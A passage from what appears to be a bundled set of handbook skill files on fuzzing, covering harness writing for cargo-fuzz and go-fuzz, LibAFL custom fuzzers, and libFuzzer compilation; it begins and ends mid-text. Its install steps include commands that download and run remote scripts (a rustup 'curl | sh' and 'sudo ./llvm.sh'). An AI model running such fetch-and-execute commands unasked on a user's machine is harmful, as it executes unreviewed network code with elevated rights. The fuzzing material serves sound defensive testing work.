libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: YourStruct| {\n    data.check();\n});\n```\n\n**Creating harness:**\n```bash\ncargo fuzz init\ncargo fuzz add my_target\n```\n\n**Integration tips:**\n- Use `arbitrary` crate for automatic struct deserialization\n- cargo-fuzz wraps libFuzzer, so all libFuzzer features work\n- Compile with sanitizers automatically via cargo-fuzz\n- Harnesses go in `fuzz/fuzz_targets/` directory\n\n**Running:**\n```bash\ncargo +nightly fuzz run my_target\n```\n\n**Resources:**\n- [cargo-fuzz documentation](https://rust-fuzz.github.io/book/cargo-fuzz.html)\n- [arbitrary crate](https://github.com/rust-fuzz/arbitrary)\n\n### go-fuzz\n\n**Harness signature:**\n```go\n// +build gofuzz\n\npackage mypackage\n\nfunc Fuzz(data []byte) int {\n    // Call target function\n    target(data)\n\n    // Return codes:\n    // -1 if input is invalid\n    //  0 if input is valid but not interesting\n    //  1 if input is interesting (e.g., added new coverage)\n    return 0\n}\n```\n\n**Building:**\n```bash\ngo-fuzz-build\n```\n\n**Integration tips:**\n- Return 1 for inputs that add coverage (optionalfuzzer can detect automatically)\n- Return -1 for invalid inputs to deprioritize similar mutations\n- go-fuzz handles persistence automatically\n\n**Running:**\n```bash\ngo-fuzz -bin=./mypackage-fuzz.zip -workdir=fuzz\n```\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| **Low executions/sec** | Harness is too slow (logging, I/O, complexity) | Profile harness, remove bottlenecks, mock I/O |\n| **No crashes found** | Coverage not reaching buggy code | Check coverage, improve harness to reach more paths |\n| **Non-reproducible crashes** | Non-determinism or global state | Remove randomness, reset globals between iterations |\n| **Fuzzer exits immediately** | Harness calls `exit()` | Replace `exit()` with `abort()` or return error |\n| **Out of memory errors** | Memory leaks in harness or SUT | Free allocations, use leak sanitizer to find leaks |\n| **Crashes on empty input** | Harness doesn't validate size | Add `if (size < MIN_SIZE) return 0;` |\n| **Corpus not growing** | Inputs too constrained or format too strict | Use FuzzedDataProvider or structure-aware fuzzing |\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Uses `LLVMFuzzerTestOneInput` harness signature with FuzzedDataProvider |\n| **aflpp** | Supports persistent mode harnesses with `__AFL_LOOP` for performance |\n| **cargo-fuzz** | Uses Rust-specific `fuzz_target!` macro with arbitrary crate integration |\n| **atheris** | Python harness takes bytes, calls Python functions |\n| **ossfuzz** | Requires harnesses in specific directory structure for cloud fuzzing |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **coverage-analysis** | Measure harness effectivenessare you reaching target code? |\n| **address-sanitizer** | Detects bugs found by harness (buffer overflows, use-after-free) |\n| **fuzzing-dictionary** | Provide tokens to help fuzzer pass format checks in harness |\n| **fuzzing-obstacles** | Patch SUT when it violates harness rules (exit, non-determinism) |\n\n## Resources\n\n### Key External Resources\n\n**[Split Inputs in libFuzzer - Google Fuzzing Docs](https://github.com/google/fuzzing/blob/master/docs/split-inputs.md)**\nExplains techniques for handling multiple input parameters in a single fuzzing harness, including use of magic separators and FuzzedDataProvider.\n\n**[Structure-Aware Fuzzing with Protocol Buffers](https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md)**\nAdvanced technique using protobuf as intermediate format with custom mutators to ensure fuzzer mutates message contents rather than format encoding.\n\n**[libFuzzer Documentation](https://llvm.org/docs/LibFuzzer.html)**\nOfficial LLVM documentation covering harness requirements, best practices, and advanced features.\n\n**[cargo-fuzz Book](https://rust-fuzz.github.io/book/cargo-fuzz.html)**\nComprehensive guide to writing Rust fuzzing harnesses with cargo-fuzz and the arbitrary crate.\n\n### Video Resources\n\n- [Effective File Format Fuzzing](https://www.youtube.com/watch?v=qTTwqFRD1H8) - Conference talk on writing harnesses for file format parsers\n- [Modern Fuzzing of C/C++ Projects](https://www.youtube.com/watch?v=x0FQkAPokfE) - Tutorial covering harness design patterns\n",
        "plugins/testing-handbook-skills/skills/libafl/SKILL.md": "---\nname: libafl\ntype: fuzzer\ndescription: >\n  LibAFL is a modular fuzzing library for building custom fuzzers. Use for\n  advanced fuzzing needs, custom mutators, or non-standard fuzzing targets.\n---\n\n# LibAFL\n\nLibAFL is a modular fuzzing library that implements features from AFL-based fuzzers like AFL++. Unlike traditional fuzzers, LibAFL provides all functionality in a modular and customizable way as a Rust library. It can be used as a drop-in replacement for libFuzzer or as a library to build custom fuzzers from scratch.\n\n## When to Use\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| libFuzzer | Quick setup, single-threaded | Low |\n| AFL++ | Multi-core, general purpose | Medium |\n| LibAFL | Custom fuzzers, advanced features, research | High |\n\n**Choose LibAFL when:**\n- You need custom mutation strategies or feedback mechanisms\n- Standard fuzzers don't support your target architecture\n- You want to implement novel fuzzing techniques\n- You need fine-grained control over fuzzing components\n- You're conducting fuzzing research\n\n## Quick Start\n\nLibAFL can be used as a drop-in replacement for libFuzzer with minimal setup:\n\n```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Call your code with fuzzer-provided data\n    my_function(data, size);\n    return 0;\n}\n```\n\nBuild LibAFL's libFuzzer compatibility layer:\n```bash\ngit clone https://github.com/AFLplusplus/LibAFL\ncd LibAFL/libafl_libfuzzer_runtime\n./build.sh\n```\n\nCompile and run:\n```bash\nclang++ -DNO_MAIN -g -O2 -fsanitize=fuzzer-no-link libFuzzer.a harness.cc main.cc -o fuzz\n./fuzz corpus/\n```\n\n## Installation\n\n### Prerequisites\n\n- Clang/LLVM 15-18\n- Rust (via rustup)\n- Additional system dependencies\n\n### Linux/macOS\n\nInstall Clang:\n```bash\napt install clang\n```\n\nOr install a specific version via apt.llvm.org:\n```bash\nwget https://apt.llvm.org/llvm.sh\nchmod +x llvm.sh\nsudo ./llvm.sh 15\n```\n\nConfigure environment for Rust:\n```bash\nexport RUSTFLAGS=\"-C linker=/usr/bin/clang-15\"\nexport CC=\"clang-15\"\nexport CXX=\"clang++-15\"\n```\n\nInstall Rust:\n```bash\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n```\n\nInstall additional dependencies:\n```bash\napt install libssl-dev pkg-config\n```\n\nFor libFuzzer compatibility mode, install nightly Rust:\n```bash\nrustup toolchain install nightly --component llvm-tools\n```\n\n### Verification\n\nBuild LibAFL to verify installation:\n```bash\ncd LibAFL/libafl_libfuzzer_runtime\n./build.sh\n# Should produce libFuzzer.a\n```\n\n## Writing a Harness\n\nLibAFL harnesses follow the same pattern as libFuzzer when using drop-in replacement mode:\n\n```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Your fuzzing target code here\n    return 0;\n}\n```\n\nWhen building custom fuzzers with LibAFL as a Rust library, harness logic is integrated directly into the fuzzer. See the \"Writing a Custom Fuzzer\" section below for the full pattern.\n\n> **See Also:** For detailed harness writing techniques, see the **harness-writing** technique skill.\n\n## Usage Modes\n\nLibAFL supports two primary usage modes:\n\n### 1. libFuzzer Drop-in Replacement\n\nUse LibAFL as a replacement for libFuzzer with existing harnesses.\n\n**Compilation:**\n```bash\nclang++ -DNO_MAIN -g -O2 -fsanitize=fuzzer-no-link libFuzzer.a harness.cc main.cc -o fuzz\n```\n\n**Running:**\n```bash\n./fuzz corpus/\n```\n\n**Recommended for long campaigns:**\n```bash\n./fuzz -fork=1 -ignore_crashes=1 corpus/\n```\n\n### 2. Custom Fuzzer as Rust Library\n\nBuild a fully customized fuzzer using LibAFL components.\n\n**Create project:**\n```bash\ncargo init --lib my_fuzzer\ncd my_fuzzer\ncargo add libafl@0.13 libafl_targets@0.13 libafl_bolts@0.13 libafl_cc@0.13 \\\n  --features \"libafl_targets@0.13/libfuzzer,libafl_targets@0.13/sancov_pcguard_hitcounts\"\n```\n\n**Configure Cargo.toml:**\n```toml\n[lib]\ncrate-type = [\"staticlib\"]\n```\n\n## Writing a Custom Fuzzer\n\n> **See Also:** For detailed harness writing techniques, patterns for handling complex inputs,\n> and advanced strategies, see the **fuzz-harness-writing** technique skill.\n\n### Fuzzer Components\n\nA LibAFL fuzzer consists of modular components:\n\n1. **Observers** - Collect execution feedback (coverage, timing)\n2. **Feedback** - Determine if inputs are interesting\n3. **Objective** - Define fuzzing goals (crashes, timeouts)\n4. **State** - Maintain corpus and metadata\n5. **Mutators** - Generate new inputs\n6. **Scheduler** - Select which inputs to mutate\n7. **Executor** - Run the target with inputs\n\n### Basic Fuzzer Structure\n\n```rust\nuse libafl::prelude::*;\nuse libafl_bolts::prelude::*;\nuse libafl_targets::{libfuzzer_test_one_input, std_edges_map_observer};\n\n#[no_mangle]\npub extern \"C\" fn libafl_main() {\n    let mut run_client = |state: Option<_>, mut restarting_mgr, _core_id| {\n        // 1. Setup observers\n        let edges_observer = HitcountsMapObserver::new(\n            unsafe { std_edges_map_observer(\"edges\") }\n        ).track_indices();\n        let time_observer = TimeObserver::new(\"time\");\n\n        // 2. Define feedback\n        let mut feedback = feedback_or!(\n            MaxMapFeedback::new(&edges_observer),\n            TimeFeedback::new(&time_observer)\n        );\n\n        // 3. Define objective\n        let mut objective = feedback_or_fast!(\n            CrashFeedback::new(),\n            TimeoutFeedback::new()\n        );\n\n        // 4. Create or restore state\n        let mut state = state.unwrap_or_else(|| {\n            StdState::new(\n                StdRand::new(),\n                InMemoryCorpus::new(),\n                OnDiskCorpus::new(&output_dir).unwrap(),\n                &mut feedback,\n                &mut objective,\n            ).unwrap()\n        });\n\n        // 5. Setup mutator\n        let mutator = StdScheduledMutator::new(havoc_mutations());\n        let mut stages = tuple_list!(StdMutationalStage::new(mutator));\n\n        // 6. Setup scheduler\n        let scheduler = IndexesLenTimeMinimizerScheduler::new(\n            &edges_observer,\n            QueueScheduler::new()\n        );\n\n        // 7. Create fuzzer\n        let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective);\n\n        // 8. Define harness\n        let mut harness = |input: &BytesInput| {\n            let buf = input.target_bytes().as_slice();\n            libfuzzer_test_one_input(buf);\n            ExitKind::Ok\n        };\n\n        // 9. Setup executor\n        let mut executor = InProcessExecutor::with_timeout(\n            &mut harness,\n            tuple_list!(edges_observer, time_observer),\n            &mut fuzzer,\n            &mut state,\n            &mut restarting_mgr,\n            timeout,\n        )?;\n\n        // 10. Load initial inputs\n        if state.must_load_initial_inputs() {\n            state.load_initial_inputs(\n                &mut fuzzer,\n                &mut executor,\n                &mut restarting_mgr,\n                &input_dir\n            )?;\n        }\n\n        // 11. Start fuzzing\n        fuzzer.fuzz_loop(&mut stages, &mut executor, &mut state, &mut restarting_mgr)?;\n        Ok(())\n    };\n\n    // Launch fuzzer\n    Launcher::builder()\n        .run_client(&mut run_client)\n        .cores(&cores)\n        .build()\n        .launch()\n        .unwrap();\n}\n```\n\n## Compilation\n\n### Verbose Mode\n\nManually specify all instrumentation flags:\n\n```bash\nclang++-15 -DNO_MAIN -g -O2 \\\n  -fsanitize-coverage=trace-pc-guard \\\n  -fsanitize=address \\\n  -Wl,--whole-archive target/release/libmy_fuzzer.a -Wl,--no-whole-archive \\\n  main.cc harness.cc -o fuzz\n```\n\n### Compiler Wrapper (Recommended)\n\nCreate a LibAFL compiler wrapper to handle instrumentation automatically.\n\n**Create `src/bin/libafl_cc.rs`:**\n```rust\nuse libafl_cc::{ClangWrapper, CompilerWrapper, Configuration, ToolWrapper};\n\npub fn main() {\n    let args: Vec<String> = env::args().collect();\n    let mut cc = ClangWrapper::new();\n    cc.cpp(is_cpp)\n      .parse_args(&args)\n      .link_staticlib(&dir, \"my_fuzzer\")\n      .add_args(&Configuration::GenerateCoverageMap.to_flags().unwrap())\n      .add_args(&Configuration::AddressSanitizer.to_flags().unwrap())\n      .run()\n      .unwrap();\n}\n```\n\n**Compile and use:**\n```bash\ncargo build --release\ntarget/release/libafl_cxx -DNO_MAIN -g -O2 main.cc harness.cc -o fuzz\n```\n\n> **See Also:** For detailed sanitizer configuration, common issues, and advanced flags,\n> see the **address-sanitizer** and **undefined-behavior-sanitizer** technique skills.\n\n## Running Campaigns\n\n### Basic Run\n\n```bash\n./fuzz --cores 0 --input corpus/\n```\n\n### Multi-Core Fuzzing\n\n```bash\n./fuzz --cores 0,8-15 --input corpus/\n```\n\nThis runs 9 clients: one on core 0, and 8 on cores 8-15.\n\n### With Options\n\n```bash\n./fuzz --cores 0-7 --input corpus/ --output crashes/ --timeout 1000\n```\n\n### Text User Interface (TUI)\n\nEnable graphical statistics view:\n\n```bash\n./fuzz -tui=1 corpus/\n```\n\n### Interpreting Output\n\n| Output | Meaning |\n|--------|---------|\n| `corpus: N` | Number of interesting test cases found |\n| `objectives: N` | Number of crashes/timeouts found |\n| `executions: N` | Total number of target invocations |\n| `exec/sec: N` | Current execution throughput |\n| `edges: X%` | Code coverage percentage |\n| `clients: N` | Number of parallel fuzzing processes |\n\nThe fuzzer emits two main event types:\n- **UserStats** - Regular heartbeat with current statistics\n- **Testcase** - New interesting input discovered\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Use `-fork=1 -ignore_crashes=1` | Continue fuzzing after first crash |\n| Use `InMemoryOnDiskCorpus` | Persist corpus across restarts |\n| Enable TUI with `-tui=1` | Better visualization of progress |\n| Use specific LLVM version | Avoid compatibility issues |\n| Set `RUSTFLAGS` correctly | Prevent linking errors |\n\n### Crash Deduplication\n\nAvoid storing duplicate crashes from the same bug:\n\n**Add backtrace observer:**\n```rust\nlet backtrace_observer = BacktraceObserver::owned(\n    \"BacktraceObserver\",\n    libafl::observers::HarnessType::InProcess\n);\n```\n\n**Update executor:**\n```rust\nlet mut executor = InProcessExecutor::with_timeout(\n    &mut harness,\n    tuple_list!(edges_observer, time_observer, backtrace_observer),\n    &mut fuzzer,\n    &mut state,\n    &mut restarting_mgr,\n    timeout,\n)?;\n```\n\n**Update objective with hash feedback:**\n```rust\nlet mut objective = feedback_and!(\n    feedback_or_fast!(CrashFeedback::new(), TimeoutFeedback::new()),\n    NewHashFeedback::new(&backtrace_observer)\n);\n```\n\nThis ensures only crashes with unique backtraces are saved.\n\n### Dictionary Fuzzing\n\nUse dictionaries to guide fuzzing toward specific tokens:\n\n**Add tokens from file:**\n```rust\nlet mut tokens = Tokens::new();\nif let Some(tokenfile) = &tokenfile {\n    tokens.add_from_file(tokenfile)?;\n}\nstate.add_metadata(tokens);\n```\n\n**Update mutator:**\n```rust\nlet mutator = StdScheduledMutator::new(\n    havoc_mutations().merge(tokens_mutations())\n);\n```\n\n**Hard-coded tokens example (PNG):**\n```rust\nstate.add_metadata(Tokens::from([\n    vec![137, 80, 78, 71, 13, 10, 26, 10], // PNG header\n    \"IHDR\".as_bytes().to_vec(),\n    \"IDAT\".as_bytes().to_vec(),\n    \"PLTE\".as_bytes().to_vec(),\n    \"IEND\".as_bytes().to_vec(),\n]));\n```\n\n> **See Also:** For detailed dictionary creation strategies and format-specific dictionaries,\n> see the **fuzzing-dictionaries** technique skill.\n\n### Auto Tokens\n\nAutomatically extract magic values and checksums from the program:\n\n**Enable in compiler wrapper:**\n```rust\ncc.add_pass(LLVMPasses::AutoTokens)\n```\n\n**Load auto tokens in fuzzer:**\n```rust\ntokens += libafl_targets::autotokens()?;\n```\n\n**Verify tokens section:**\n```bash\necho \"p (uint8_t *)__token_start\" | gdb fuzz\n```\n\n### Performance Tuning\n\n| Setting | Impact |\n|---------|--------|\n| Multi-core fuzzing | Linear speedup with cores |\n| `InMemoryCorpus` | Faster but non-persistent |\n| `InMemoryOnDiskCorpus` | Balanced speed and persistence |\n| Sanitizers | 2-5x slowdown, essential for bugs |\n| Optimization level `-O2` | Balance between speed and coverage |\n\n### Debugging Fuzzer\n\nRun fuzzer in single-process mode for easier debugging:\n\n```rust\n// Replace launcher with direct call\nrun_client(None, SimpleEventManager::new(monitor), 0).unwrap();\n\n// Comment out:\n// Launcher::builder()\n//     .run_client(&mut run_client)\n//     ...\n//     .launch()\n```\n\nThen debug with GDB:\n```bash\ngdb --args ./fuzz --cores 0 --input corpus/\n```\n\n## Real-World Examples\n\n### Example: libpng\n\nFuzzing libpng using LibAFL:\n\n**1. Get source code:**\n```bash\ncurl -L -O https://downloads.sourceforge.net/project/libpng/libpng16/1.6.37/libpng-1.6.37.tar.xz\ntar xf libpng-1.6.37.tar.xz\ncd libpng-1.6.37/\napt install zlib1g-dev\n```\n\n**2. Set compiler wrapper:**\n```bash\nexport FUZZER_CARGO_DIR=\"/path/to/libafl/project\"\nexport CC=$FUZZER_CARGO_DIR/target/release/libafl_cc\nexport CXX=$FUZZER_CARGO_DIR/target/release/libafl_cxx\n```\n\n**3. Build static library:**\n```bash\n./configure --enable-shared=no\nmake\n```\n\n**4. Get harness:**\n```bash\ncurl -O https://raw.githubusercontent.com/glennrp/libpng/f8e5fa92b0e37ab597616f554bee254157998227/contrib/oss-fuzz/libpng_read_fuzzer.cc\n```\n\n**5. Link fuzzer:**\n```bash\n$CXX libpng_read_fuzzer.cc .libs/libpng16.a -lz -o fuzz\n```\n\n**6. Prepare seeds:**\n```bash\nmkdir seeds/\ncurl -o seeds/input.png https://raw.githubusercontent.com/glennrp/libpng/acfd50ae0ba3198ad734e5d4dec2b05341e50924/contrib/pngsuite/iftp1n3p08.png\n```\n\n**7. Get dictionary (optional):**\n```bash\ncurl -O https://raw.githubusercontent.com/glennrp/libpng/2fff013a6935967960a5ae626fc21432807933dd/contrib/oss-fuzz/png.dict\n```\n\n**8. Start fuzzing:**\n```bash\n./fuzz --input seeds/ --cores 0 -x png.dict\n```\n\n### Example: CMake Project\n\nIntegrate LibAFL with CMake build system:\n\n**CMakeLists.txt:**\n```cmake\nproject(BuggyProgram)\ncmake_minimum_required(VERSION 3.0)\n\nadd_executable(buggy_program main.cc)\n\nadd_executable(fuzz main.cc harness.cc)\ntarget_compile_definitions(fuzz PRIVATE NO_MAIN=1)\ntarget_compile_options(fuzz PRIVATE -g -O2)\n```\n\n**Build non-instrumented binary:**\n```bash\ncmake -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ .\ncmake --build . --target buggy_program\n```\n\n**Build fuzzer:**\n```bash\nexport FUZZER_CARGO_DIR=\"/path/to/libafl/project\"\ncmake -DCMAKE_C_COMPILER=$FUZZER_CARGO_DIR/target/release/libafl_cc \\\n      -DCMAKE_CXX_COMPILER=$FUZZER_CARGO_DIR/target/release/libafl_cxx .\ncmake --build . --target fuzz\n```\n\n**Run fuzzing:**\n```bash\n./fuzz --input seeds/ --cores 0\n```\n\n## Troubleshooting\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| No coverage increases | Instrumentation failed | Verify compiler wrapper used, check for `-fsanitize-coverage` |\n| Fuzzer won't start | Empty corpus with no interesting inputs | Provide seed inputs that trigger code paths |\n| Linker errors with `libafl_main` | Runtime not linked | Use `-Wl,--whole-archive` or `-u libafl_main` |\n| LLVM version mismatch | LibAFL requires LLVM 15-18 | Install compatible LLVM version, set environment variables |\n| Rust compilation fails | Outdated Rust or Cargo | Update Rust with `rustup update` |\n| Slow fuzzing | Sanitizers enabled | Expected 2-5x slowdown, necessary for finding bugs |\n| Environment variable interference | `CC`, `CXX`, `RUSTFLAGS` set | Unset after building LibAFL project |\n| Cannot attach debugger | Multi-process fuzzing | Run in single-process mode (see Debugging section) |\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Detailed guidance on writing effective harnesses |\n| **address-sanitizer** | Memory error detection during fuzzing |\n| **undefined-behavior-sanitizer** | Undefined behavior detection |\n| **coverage-analysis** | Measuring and improving code coverage |\n| **fuzzing-corpus** | Building and managing seed corpora |\n| **fuzzing-dictionaries** | Creating dictionaries for format-aware fuzzing |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **libfuzzer** | Simpler setup, don't need LibAFL's advanced features |\n| **aflpp** | Multi-core fuzzing without custom fuzzer development |\n| **cargo-fuzz** | Fuzzing Rust projects with less setup |\n\n## Resources\n\n### Official Documentation\n\n- [LibAFL Book](https://aflplus.plus/libafl-book/) - Official handbook with comprehensive documentation\n- [LibAFL GitHub](https://github.com/AFLplusplus/LibAFL) - Source code and examples\n- [LibAFL API Documentation](https://docs.rs/libafl/latest/libafl/) - Rust API reference\n\n### Examples and Tutorials\n\n- [LibAFL Examples](https://github.com/AFLplusplus/LibAFL/tree/main/fuzzers) - Collection of example fuzzers\n- [cargo-fuzz with LibAFL](https://github.com/AFLplusplus/LibAFL/tree/main/fuzzers/fuzz_anything/cargo_fuzz) - Using LibAFL as cargo-fuzz backend\n- [Testing Handbook LibAFL Examples](https://github.com/trailofbits/testing-handbook/tree/main/materials/fuzzing/libafl) - Complete working examples from this handbook\n",
        "plugins/testing-handbook-skills/skills/libfuzzer/SKILL.md": "---\nname: libfuzzer\ntype: fuzzer\ndescription: >\n  Coverage-guided fuzzer built into LLVM for C/C++ projects. Use for fuzzing\n  C/C++ code that can be compiled with Clang.\n---\n\n# libFuzzer\n\nlibFuzzer is an in-process, coverage-guided fuzzer that is part of the LLVM project. It's the recommended starting point for fuzzing C/C++ projects due to its simplicity and integration with the LLVM toolchain. While libFuzzer has been in maintenance-only mode since late 2022, it is easier to install and use than its alternatives, has wide support, and will be maintained for the foreseeable future.\n\n## When to Use\n\n| Fuzzer | Best For | Complexity |\n|--------|----------|------------|\n| libFuzzer | Quick setup, single-project fuzzing | Low |\n| AFL++ | Multi-core fuzzing, diverse mutations | Medium |\n| LibAFL | Custom fuzzers, research projects | High |\n| Honggfuzz | Hardware-based coverage | Medium |\n\n**Choose libFuzzer when:**\n- You need a simple, quick setup for C/C++ code\n- Project uses Clang for compilation\n- Single-core fuzzing is sufficient initially\n- Transitioning to AFL++ later is an option (harnesses are compatible)\n\n**Note:** Fuzzing harnesses written for libFuzzer are compatible with AFL++, making it easy to transition if you need more advanced features like better multi-core support.\n\n## Quick Start\n\n```c++\n#include <stdint.h>\n#include <stddef.h>\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Validate input if needed\n    if (size < 1) return 0;\n\n    // Call your target function with fuzzer-provided data\n    my_target_function(data, size);\n\n    return 0;\n}\n```\n\nCompile and run:\n```bash\nclang++ -fsanitize=fuzzer,address -g -O2 harness.cc target.cc -o fuzz\nmkdir corpus/\n./fuzz corpus/\n```\n\n## Installation\n\n### Prerequisites\n\n- LLVM/Clang compiler (includes libFuzzer)\n- LLVM tools for coverage analysis (optional)\n\n### Linux (Ubuntu/Debian)\n\n```bash\napt install clang llvm\n```\n\nFor the latest LLVM version:\n```bash\n# Add LLVM repository from apt.llvm.org\n# Then install specific version, e.g.:\napt install clang-18 llvm-18\n```\n\n### macOS\n\n```bash\n# Using Homebrew\nbrew install llvm\n\n# Or using Nix\nnix-env -i clang\n```\n\n### Windows\n\nInstall Clang through Visual Studio. Refer to [Microsoft's documentation](https://learn.microsoft.com/en-us/cpp/build/clang-support-msbuild?view=msvc-170) for setup instructions.\n\n**Recommendation:** If possible, fuzz on a local x86_64 VM or rent one on DigitalOcean, AWS, or Hetzner. Linux provides the best support for libFuzzer.\n\n### Verification\n\n```bash\nclang++ --version\n# Should show LLVM version information\n```\n\n## Writing a Harness\n\n### Harness Structure\n\nThe harness is the entry point for the fuzzer. libFuzzer calls the `LLVMFuzzerTestOneInput` function repeatedly with different inputs.\n\n```c++\n#include <stdint.h>\n#include <stddef.h>\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // 1. Optional: Validate input size\n    if (size < MIN_REQUIRED_SIZE) {\n        return 0;  // Reject inputs that are too small\n    }\n\n    // 2. Optional: Convert raw bytes to structured data\n    // Example: Parse two integers from byte array\n    if (size >= 2 * sizeof(uint32_t)) {\n        uint32_t a = *(uint32_t*)(data);\n        uint32_t b = *(uint32_t*)(data + sizeof(uint32_t));\n        my_function(a, b);\n    }\n\n    // 3. Call target function\n    target_function(data, size);\n\n    // 4. Always return 0 (non-zero reserved for future use)\n    return 0;\n}\n```\n\n### Harness Rules\n\n| Do | Don't |\n|----|-------|\n| Handle all input types (empty, huge, malformed) | Call `exit()` - stops fuzzing process |\n| Join all threads before returning | Leave threads running |\n| Keep harness fast and simple | Add excessive logging or complexity |\n| Maintain determinism | Use random number generators or read `/dev/random` |\n| Reset global state between runs | Rely on state from previous executions |\n| Use narrow, focused targets | Mix unrelated data formats (PNG + TCP) in one harness |\n\n**Rationale:**\n- **Speed matters:** Aim for 100s-1000s executions per second per core\n- **Reproducibility:** Crashes must be reproducible after fuzzing completes\n- **Isolation:** Each execution should be independent\n\n### Using FuzzedDataProvider for Complex Inputs\n\nFor complex inputs (strings, multiple parameters), use the `FuzzedDataProvider` helper:\n\n```c++\n#include <stdint.h>\n#include <stddef.h>\n#include \"FuzzedDataProvider.h\"  // From LLVM project\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    FuzzedDataProvider fuzzed_data(data, size);\n\n    // Extract structured data\n    size_t allocation_size = fuzzed_data.ConsumeIntegral<size_t>();\n    std::vector<char> str1 = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);\n    std::vector<char> str2 = fuzzed_data.ConsumeBytesWithTerminator<char>(32, 0xFF);\n\n    // Call target with extracted data\n    char* result = concat(&str1[0], str1.size(), &str2[0], str2.size(), allocation_size);\n    if (result != NULL) {\n        free(result);\n    }\n\n    return 0;\n}\n```\n\nDownload `FuzzedDataProvider.h` from the [LLVM repository](https://github.com/llvm/llvm-project/blob/main/compiler-rt/include/fuzzer/FuzzedDataProvider.h).\n\n### Interleaved Fuzzing\n\nUse a single harness to test multiple related functions:\n\n```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if (size < 1 + 2 * sizeof(int32_t)) {\n        return 0;\n    }\n\n    uint8_t mode = data[0];\n    int32_t numbers[2];\n    memcpy(numbers, data + 1, 2 * sizeof(int32_t));\n\n    // Select function based on first byte\n    switch (mode % 4) {\n        case 0: add(numbers[0], numbers[1]); break;\n        case 1: subtract(numbers[0], numbers[1]); break;\n        case 2: multiply(numbers[0], numbers[1]); break;\n        case 3: divide(numbers[0], numbers[1]); break;\n    }\n\n    return 0;\n}\n```\n\n> **See Also:** For detailed harness writing techniques, patterns for handling complex inputs,\n> structure-aware fuzzing, and protobuf-based fuzzing, see the **fuzz-harness-writing** technique skill.\n\n## Compilation\n\n### Basic Compilation\n\nThe key flag is `-fsanitize=fuzzer`, which:\n- Links the libFuzzer runtime (provides `main` function)\n- Enables SanitizerCoverage instrumentation for coverage tracking\n- Disables built-in functions like `memcmp`\n\n```bash\nclang++ -fsanitize=fuzzer -g -O2 harness.cc target.cc -o fuzz\n```\n\n**Flags explained:**\n- `-fsanitize=fuzzer`: Enable libFuzzer\n- `-g`: Add debug symbols (helpful for crash analysis)\n- `-O2`: Production-level optimizations (recommended for fuzzing)\n- `-DNO_MAIN`: Define macro if your code has a `main` function\n\n### With Sanitizers\n\n**AddressSanitizer (recommended):**\n```bash\nclang++ -fsanitize=fuzzer,address -g -O2 -U_FORTIFY_SOURCE harness.cc target.cc -o fuzz\n```\n\n**Multiple sanitizers:**\n```bash\nclang++ -fsanitize=fuzzer,address,undefined -g -O2 harness.cc target.cc -o fuzz\n```\n\n> **See Also:** For detailed sanitizer configuration, common issues, ASAN_OPTIONS flags,\n> and advanced sanitizer usage, see the **address-sanitizer** and **undefined-behavior-sanitizer**\n> technique skills.\n\n### Build Flags\n\n| Flag | Purpose |\n|------|---------|\n| `-fsanitize=fuzzer` | Enable libFuzzer runtime and instrumentation |\n| `-fsanitize=address` | Enable AddressSanitizer (memory error detection) |\n| `-fsanitize=undefined` | Enable UndefinedBehaviorSanitizer |\n| `-fsanitize=fuzzer-no-link` | Instrument without linking fuzzer (for libraries) |\n| `-g` | Include debug symbols |\n| `-O2` | Production optimization level |\n| `-U_FORTIFY_SOURCE` | Disable fortification (can interfere with ASan) |\n\n### Building Static Libraries\n\nFor projects that produce static libraries:\n\n1. Build the library with fuzzing instrumentation:\n```bash\nexport CC=clang CFLAGS=\"-fsanitize=fuzzer-no-link -fsanitize=address\"\nexport CXX=clang++ CXXFLAGS=\"$CFLAGS\"\n./configure --enable-shared=no\nmake\n```\n\n2. Link the static library with your harness:\n```bash\nclang++ -fsanitize=fuzzer -fsanitize=address harness.cc libmylib.a -o fuzz\n```\n\n### CMake Integration\n\n```cmake\nproject(FuzzTarget)\ncmake_minimum_required(VERSION 3.0)\n\nadd_executable(fuzz main.cc harness.cc)\ntarget_compile_definitions(fuzz PRIVATE NO_MAIN=1)\ntarget_compile_options(fuzz PRIVATE -g -O2 -fsanitize=fuzzer -fsanitize=address)\ntarget_link_libraries(fuzz -fsanitize=fuzzer -fsanitize=address)\n```\n\nBuild with:\n```bash\ncmake -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ .\ncmake --build .\n```\n\n## Corpus Management\n\n### Creating Initial Corpus\n\nCreate a directory for the corpus (can start empty):\n\n```bash\nmkdir corpus/\n```\n\n**Optional but recommended:** Provide seed inputs (valid example files):\n\n```bash\n# For a PNG parser:\ncp examples/*.png corpus/\n\n# For a protocol parser:\ncp test_packets/*.bin corpus/\n```\n\n**Benefits of seed inputs:**\n- Fuzzer doesn't start from scratch\n- Reaches valid code paths faster\n- Significantly improves effectiveness\n\n### Corpus Structure\n\nThe corpus directory contains:\n- Input files that trigger unique code paths\n- Minimized versions (libFuzzer automatically minimizes)\n- Named by content hash (e.g., `a9993e364706816aba3e25717850c26c9cd0d89d`)\n\n### Corpus Minimization\n\nlibFuzzer 